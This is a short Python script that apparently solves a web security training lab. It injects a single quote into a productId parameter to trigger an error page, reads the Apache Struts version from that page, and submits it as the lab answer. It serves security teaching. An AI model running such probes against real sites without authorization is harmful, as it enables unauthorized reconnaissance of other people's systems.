import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_framework(s, url):
    print("[*] Using single quote character to throw error in product page...")
    product_payload = url + "/product?productId=1'"
    r = s.get(product_payload, verify=False)
    for line in r.text.splitlines():
        if "Apache Struts" in line:
            fw = line.strip()
            print(fw)
            return fw
    return None

def submit_answer(s, url):
    fw = get_framework(s, url)
    print("[*] Submitting answer...")
    submit_url = url + "/submitSolution"
    data = {"answer": fw}
    r = s.post(submit_url, data=data, verify=False, allow_redirects=True)
    if "correct" in r.text:
        return True
    return False       


def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <URL>")
        sys.exit(0)

    s = requests.Session()
    url = sys.argv[1].strip().rstrip("/")

    if  not submit_answer(s, url):
        print("[+] Error submitting answer")
        return
    print("[+] Lab solved")            

if __name__=="__main__":
    main()    